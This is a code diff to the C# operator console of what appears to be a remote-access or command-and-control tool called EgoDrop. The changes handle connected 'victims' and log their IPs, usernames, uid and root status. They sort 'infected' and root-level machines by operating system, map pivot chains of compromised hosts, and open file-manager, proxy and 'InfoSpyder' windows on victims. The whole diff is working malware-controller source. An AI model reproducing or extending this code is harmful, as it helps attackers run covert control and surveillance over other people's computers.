@@ -1,4 +1,5 @@
 using EgoDrop.Properties;
+using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Resources;
 
@@ -25,14 +26,14 @@ namespace EgoDrop
         /// Obtain victim object from listviewitem object.
         /// </summary>
         /// <param name="item"></param>
-        /// <returns></returns>
+        /// <returns>Victim object.</returns>
         private clsVictim fnGetVictimFromTag(ListViewItem item) => item.Tag == null ? null : (clsVictim)item.Tag; //Obtain victim object.
 
         /// <summary>
-        /// 
+        /// Obtain victim object from listview through ID.
         /// </summary>
-        /// <param name="szID"></param>
-        /// <returns></returns>
+        /// <param name="szID">Victim's ID.</param>
+        /// <returns>Victim object.</returns>
         private clsVictim fnGetVictimWithID(string szID)
         {
             ListViewItem item = listView1.FindItemWithText(szID);
@@ -40,10 +41,10 @@ namespace EgoDrop
         }
 
         /// <summary>
-        /// 
+        /// Obtain victim's ID from listviewitem.
         /// </summary>
-        /// <param name="item"></param>
-        /// <returns></returns>
+        /// <param name="item">ListViewItem</param>
+        /// <returns>Victim object.</returns>
         private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;
 
         #endregion
@@ -106,25 +107,26 @@ namespace EgoDrop
                     string szID = lsMsg[4];
                     if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
                     {
-                        ListViewItem item = new ListViewItem(lsMsg[1]);                //Screen (sudo required!).
-                        item.SubItems.Add(szID);                                       //Victim ID.
-                        item.SubItems.Add(victim.m_sktClnt.RemoteEndPoint.ToString()); //External IPv4 address.
-                        item.SubItems.Add(lsMsg[3]);                                   //Internal IPv4 address.
-                        item.SubItems.Add(lsMsg[5]);                                   //Username.
-                        item.SubItems.Add(lsMsg[6]);                                   //uid.
-                        item.SubItems.Add(lsMsg[7]);                                   //root?
-                        item.SubItems.Add(lsMsg[8]);                                   //Operating system.
-                        item.SubItems.Add(string.Empty);                               //Active window title (if not null or empty).
+                        string szIpExt = victim.m_sktClnt.RemoteEndPoint.ToString();
+
+                        ListViewItem item = new ListViewItem(lsMsg[1]); //Screen (sudo required!).
+                        item.SubItems.Add(szID);                        //Victim ID.
+                        item.SubItems.Add(szIpExt);                     //External IPv4 address.
+                        item.SubItems.Add(lsMsg[3]);                    //Internal IPv4 address.
+                        item.SubItems.Add(lsMsg[5]);                    //Username.
+                        item.SubItems.Add(lsMsg[6]);                    //uid.
+                        item.SubItems.Add(lsMsg[7]);                    //root?
+                        item.SubItems.Add(lsMsg[8]);                    //Operating system.
+                        item.SubItems.Add(string.Empty);                //Active window title (if not null or empty).
 
                         item.Tag = victim;
 
                         listView1.Items.Add(item);
 
-                        fnSysLog($"New victim[{victim.m_sktClnt.RemoteEndPoint.ToString()}]"); //Write new log message.
+                        fnSysLog($"New victim[{szID}]"); //Write new log message.
 
-                        //Add to group treeview.
+                        //todo: Add to group treeview.
 
-                        //imageList1.ImageSize = new Size(100, 100);
                     }
                 }));
             }
@@ -135,26 +137,123 @@ namespace EgoDrop
         /// </summary>
         /// <param name="ltn">Listener object.</param>
         /// <param name="vic">Victim object.</param>
-        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic)
+        public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic, string szVictimID)
         {
+            TreeNode fnFindNode(List<string> lsVictim, TreeNode nodeParent = null)
+            {
+                foreach (TreeNode node in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
+                {
+                    if (string.Equals(node.Text, lsVictim.First()))
+                    {
+                        if (lsVictim.Count == 1)
+                            return node;
+                        else
+                            return fnFindNode(lsVictim[1..], node);
+                    }
+                }
+
+                return nodeParent;
+            }
+
             if (vic == null || vic.m_sktClnt == null || vic.m_sktClnt.RemoteEndPoint == null)
                 return;
 
             Invoke(new Action(() =>
             {
+                //Remove from listview.
                 foreach (ListViewItem item in listView1.Items)
                 {
                     if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)))
                     {
                         listView1.Items.Remove(item);
-                        fnSysLog($"Offline[{vic.m_sktClnt.RemoteEndPoint.ToString()}]");
+                        fnSysLog($"Offline[{szVictimID}]");
                     }
                 }
+
+                //Remove from treeview.
+
+
+                //Remove from networkview.
+
             }));
         }
 
-        public void fnOnAddChain(List<string> lsVictim)
+        /// <summary>
+        /// Add victim chain.
+        /// </summary>
+        /// <param name="lsVictim"></param>
+        public void fnOnAddChain(List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4)
         {
+            NetworkView.enMachineStatus fnGetStatusFromOS(string szOS)
+            {
+                szOS = szOS.ToLower();
+
+                string[] asWindows = new string[]
+                {
+                    "windows",
+                };
+                string[] asLinux = new string[]
+                {
+                    "linux",
+                    "ubuntu",
+                    "freebsd",
+                    "centos",
+                    "debian",
+                };
+
+                foreach (string s in asWindows)
+                {
+                    if (szOS.Contains(s))
+                    {
+                        return NetworkView.enMachineStatus.Windows_Infected;
+                    }
+                }
+                foreach (string s in asLinux)
+                {
+                    if (szOS.Contains(s))
+                    {
+                        return NetworkView.enMachineStatus.Linux_Infected;
+                    }
+                }
+
+                return NetworkView.enMachineStatus.Unknown;
+            }
+            void fnAddTreeView(List<string> lsVictim, NetworkView.enMachineStatus status, TreeNode nodeParent = null)
+            {
+                TreeNode node = null;
+                foreach (TreeNode n in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
+                {
+                    if (string.Equals(n.Text, lsVictim.First()))
+                    {
+                        node = n;
+                        break;
+                    }
+                }
+
+                if (node == null)
+                {
+                    node = new TreeNode(lsVictim.First());
+                    node.ImageKey = Enum.GetName(status);
+
+                    if (nodeParent == null)
+                    {
+                        treeView2.Nodes.Add(node);
+                    }
+                    else
+                    {
+                        nodeParent.Nodes.Add(node);
+                        nodeParent.Expand();
+
+                        nodeParent.EnsureVisible();
+                    }
+                }
+
+                if (lsVictim.Count == 1)
+                    return;
+
+                fnAddTreeView(lsVictim[1..], status, node);
+            }
+
             Invoke(new Action(() =>
             {
                 try
@@ -168,11 +267,21 @@ namespace EgoDrop
                             continue;
                         }
 
-                        var n1 = networkView1.AddNode($"{szVictim}", $"{szVictim}", NetworkView.enMachineStatus.Linux_Infected);
-                        networkView1.fnSetMahcineStatus(n1, NetworkView.enMachineStatus.Linux_Infected);
+                        var status = fnGetStatusFromOS(szOS);
+                        if (bRoot)
+                        {
+                            if (status == NetworkView.enMachineStatus.Linux_Infected)
+                                status = NetworkView.enMachineStatus.Linux_Super;
+                            else if (status == NetworkView.enMachineStatus.Windows_Infected)
+                                status = NetworkView.enMachineStatus.Windows_Super;
+                        }
+
+                        var n1 = networkView1.AddNode($"{szVictim}", $"{szUsername}@{szVictim}\n{szIPv4}", status);
 
                         clsVictim victim = fnGetVictimWithID(szVictim);
                         victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);
+
+                        fnAddTreeView(lsVictim, status);
 
                         if (i == 0)
                         {
@@ -193,7 +302,7 @@ namespace EgoDrop
                 }
                 catch (Exception ex)
                 {
-                    
+
                 }
             }));
         }
@@ -210,19 +319,13 @@ namespace EgoDrop
 
             networkView1.imageList = imageList1;
 
-            void fnTest()
-            {
-                var n1 = networkView1.AddNode("Host A", "111", NetworkView.enMachineStatus.Linux_Normal); //Add to network view.
-                var n2 = networkView1.AddNode("Host B", "222", NetworkView.enMachineStatus.Windows_Normal);
-                var n3 = networkView1.AddNode("Host C", "333", NetworkView.enMachineStatus.Firewall);
-                var n4 = networkView1.AddNode("Host D", "444", NetworkView.enMachineStatus.Router_Infected);
+            ImageList smallImageList = new ImageList();
+            foreach (string szKey in imageList1.Images.Keys)
+                smallImageList.Images.Add(szKey, imageList1.Images[szKey]);
 
-                networkView1.AddConnection(n1, n2);
-                networkView1.AddConnection(n2, n3);
-                networkView1.AddConnection(n2, n4);
-            }
-            
-            //fnTest();
+            smallImageList.ImageSize = new Size(30, 30);
+
+            treeView2.ImageList = smallImageList;
 
             networkView1.Zoom = 1.0f;
         }
@@ -266,7 +369,8 @@ namespace EgoDrop
         {
             foreach (ListViewItem item in listView1.SelectedItems)
             {
-                frmInfoSpyder f = new frmInfoSpyder(fnGetVictimFromTag(item));
+                string szVictimID = fnszGetVictimID(item);
+                frmInfoSpyder f = new frmInfoSpyder(szVictimID, fnGetVictimFromTag(item));
                 f.Show();
             }
         }
@@ -379,6 +483,9 @@ namespace EgoDrop
                 return;
 
             string szID = node.szVictimID;
+            if (string.IsNullOrEmpty(szID))
+                return;
+
             ListViewItem item = listView1.FindItemWithText(szID, true, 0);
             if (item == null)
                 return;
@@ -387,6 +494,35 @@ namespace EgoDrop
 
             frmServerProxy f = new frmServerProxy(szID, victim);
             f.Show();
+        }
+
+        private void toolStripMenuItem13_Click(object sender, EventArgs e)
+        {
+            Node node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            string szID = node.szVictimID;
+            clsVictim victim = fnGetVictimWithID(szID);
+
+            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
+            if (f == null)
+            {
+                f = new frmFileMgr(szID, victim);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+        }
+
+        private void toolStripMenuItem14_Click(object sender, EventArgs e)
+        {
+            frmGroup f = new frmGroup(this, m_sqlite);
+            f.ShowDialog();
+
+            var ls = m_sqlite.fnlsGetGroups();
         }
     }
 }
